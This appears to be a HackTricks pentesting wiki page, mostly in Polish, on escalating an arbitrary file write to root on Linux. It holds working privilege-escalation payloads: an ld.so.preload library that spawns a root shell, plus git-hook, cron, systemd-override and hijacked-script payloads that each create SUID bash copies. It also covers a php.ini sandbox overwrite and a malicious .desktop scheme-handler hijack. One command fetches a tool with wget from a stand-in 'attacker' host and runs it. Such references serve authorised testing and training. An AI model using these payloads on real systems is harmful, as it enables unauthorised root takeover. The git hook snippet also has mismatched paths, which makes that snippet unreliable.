# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ten plik zachowuje się jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa też w **SUID binaries**.\
Jeśli możesz go utworzyć lub zmodyfikować, możesz po prostu dodać **ścieżkę do biblioteki, która będzie ładowana** przy każdym uruchamianym programie.

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **uruchamiane** przy różnych **zdarzeniach** w repozytorium git, np. gdy tworzony jest commit, merge... Jeśli więc **uprzywilejowany skrypt lub użytkownik** często wykonuje te akcje i możliwe jest **zapisanie w folderze `.git`**, można to wykorzystać do **privesc**.

Na przykład, możliwe jest **wygenerowanie skryptu** w repozytorium git w **`.git/hooks`**, tak aby był on zawsze wykonywany, gdy tworzony jest nowy commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & pliki czasowe

Jeśli możesz **zapisać pliki związane z cron, które root uruchamia**, zwykle możesz uzyskać wykonanie kodu przy następnym uruchomieniu zadania. Interesujące cele to:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- własny crontab roota w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- timery `systemd` i usługi, które one wywołują

Szybkie sprawdzenia:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Dodanie nowego root cron job** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąpić skrypt** już wykonywany przez `run-parts`
- **Backdoor an existing timer target** przez modyfikację skryptu lub binarki, którą uruchamia

Minimalny przykład cron payloadu:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Jeśli możesz zapisywać tylko w katalogu cron używanym przez `run-parts`, umieść tam plik wykonywalny:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notatki:

- `run-parts` zwykle ignoruje nazwy plików zawierające kropki, więc preferuj nazwy takie jak `backup` zamiast `backup.sh`.
- Niektóre dystrybucje używają `anacron` lub timerów `systemd` zamiast klasycznego cron, ale idea nadużycia jest taka sama: **zmodyfikować to, co root wykona później**.

### Pliki usług i socketów

Jeśli możesz zapisać **`systemd` unit files** lub pliki, na które się one odwołują, możesz uzyskać wykonanie kodu jako root poprzez przeładowanie i restart jednostki, albo poprzez oczekiwanie na wyzwolenie ścieżki aktywacji usługi/socketu.

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binarne pliki usług wskazywane przez `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisowalne ścieżki `EnvironmentFile=` ładowane przez usługę działającą jako root

Szybkie sprawdzenia:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Overwrite `ExecStart=`** w jednostce usługi należącej do roota, którą możesz zmodyfikować
- **Add a drop-in override** z złośliwym `ExecStart=` i najpierw wyczyść poprzedni wpis
- **Backdoor the script/binary** już wskazywanego przez jednostkę
- **Hijack a socket-activated service** modyfikując odpowiadający plik `.service`, który uruchamia się, gdy socket otrzyma połączenie

Przykład złośliwego override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typowy przebieg aktywacji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Jeśli nie możesz samodzielnie zrestartować usług, ale możesz edytować socket-activated unit, może wystarczyć, że **poczekasz na połączenie klienta**, aby spowodować uruchomienie podmienionej usługi z uprawnieniami root.

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowany sandbox PHP

Niektóre niestandardowe demony walidują dostarczony przez użytkownika kod PHP, uruchamiając `php` z **restrykcyjnym `php.ini`** (np. `disable_functions=exec,system,...`). Jeśli kod uruchamiany w sandboxie nadal ma **any write primitive** (np. `file_put_contents`) i możesz dotrzeć do **dokładnej ścieżki `php.ini`** używanej przez demona, możesz **nadpisać tę konfigurację**, aby zdjąć ograniczenia, a następnie przesłać drugi payload, który uruchomi się z podwyższonymi uprawnieniami.

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxa.
2. Drugi payload wykonuje kod teraz, gdy niebezpieczne funkcje zostały ponownie włączone.

Minimalny przykład (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the demon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który binarny program ma uruchamiać jaki typ plików. TODO: sprawdzić wymagania, żeby wykorzystać to do wykonania rev shell, gdy otwarty jest popularny typ pliku.

### Overwrite schema handlers (like http: or https:)

Atakujący z uprawnieniami zapisu do katalogów konfiguracyjnych ofiary może łatwo zastąpić lub utworzyć pliki zmieniające zachowanie systemu, prowadząc do niezamierzonego wykonania kodu. Modyfikując plik `$HOME/.config/mimeapps.list`, aby skierować obsługiwacze URL HTTP i HTTPS na złośliwy plik (np. ustawiając `x-scheme-handler/http=evil.desktop`), atakujący zapewnia, że **kliknięcie dowolnego linku http lub https uruchamia kod wskazany w tym pliku `evil.desktop`**. Na przykład, po umieszczeniu następującego złośliwego kodu w `evil.desktop` w `$HOME/.local/share/applications`, każde kliknięcie zewnętrznego URL uruchamia osadzoną komendę:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Po więcej informacji sprawdź [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) gdzie zostało użyte do wykorzystania rzeczywistej podatności.

### Root executing user-writable scripts/binaries

Jeśli uprzywilejowany workflow uruchamia coś w rodzaju `/bin/sh /home/username/.../script` (lub dowolne binary wewnątrz katalogu należącego do nieuprzywilejowanego użytkownika), możesz to przejąć:

- **Wykryj uruchomienie:** monitoruj procesy za pomocą [pspy](https://github.com/DominicBreuker/pspy), aby wykryć procesy root wywołujące ścieżki kontrolowane przez użytkownika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** upewnij się, że zarówno docelowy plik, jak i jego katalog są własnością i zapisywalne przez twojego użytkownika.
- **Hijack the target:** zrób kopię zapasową oryginalnego binary/script i wgraj payload, który tworzy SUID shell (lub wykonuje inne działanie jako root), następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Uruchom uprzywilejowaną akcję** (np. naciśnięcie przycisku UI, który uruchamia helpera). Gdy root ponownie wykona przejętą ścieżkę, przejmij eskalowany shell przy użyciu `./rootshell -p`.

## Referencje

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
